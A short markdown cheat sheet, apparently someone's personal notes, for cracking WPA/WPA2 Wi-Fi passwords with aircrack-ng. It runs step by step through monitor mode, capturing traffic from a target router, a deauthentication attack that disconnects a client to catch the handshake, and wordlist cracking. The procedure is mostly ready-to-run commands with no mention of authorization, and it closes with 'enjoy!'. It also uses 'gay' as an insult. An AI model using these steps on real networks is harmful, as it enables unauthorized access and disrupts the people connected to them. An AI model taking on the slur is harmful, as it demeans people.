# Monitor mode on
```
airmon-ng                   -> search which interface can be monitored. (probably wlan0)
airmon-ng start wlan0
```
# Check which interface is monitored
```
iwconfig
(probably wlan0mon)
```
# Get all wireless routers (wifis) around
```
airodump-ng wlan0mon

*** You need to save the BSSID (MAC address) of the wifi u want + the channel number ***
```
# Start sniffing the network
```
airodump-ng -c 3 —bssid 9C:5C:8E:C9:AB:C0 -w DonAndLiron wlan0mon           -> -c = channel of the (optional) ; -bssid (router mac address) ;  -w name to save the capture (cap)
```
now we wait to check for the "WPA handshake: D4:AB:BC:DC:CD:AD" to pop up. that means uve got a handshake.
# Deauth attack
```
On the previous step, u sniffed the wifi. now u can deauth a client and catch the handshake.
under youll see another table. (BSSID STATION PWR Rate Lost Frames Notes Probes)     -> we care about BSSID, STATION and LOST , FRAMES, NOTES.
BSSID is the wifi MAC address
STATION is the client's MAC address
LOST and Frames will be usefull to see if the deauth works.
Notes = name of the client (not always it says the name)

now after u get the shit u need its time to deauth. (if it says cannot deauth cause gay is channel 4 and u channel 6 so just spam the command it will catch what u need)

aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 wlan0mon
```
# Crack the Cap!
```
aircrack DonAndLiron-01.cap -w /usr/share/wordlists/rockyou.txt          -> -w wordlist.
enjoy!
```
https://hakin9.org/crack-wpa-wpa2-wi-fi-routers-with-aircrack-ng-and-hashcat/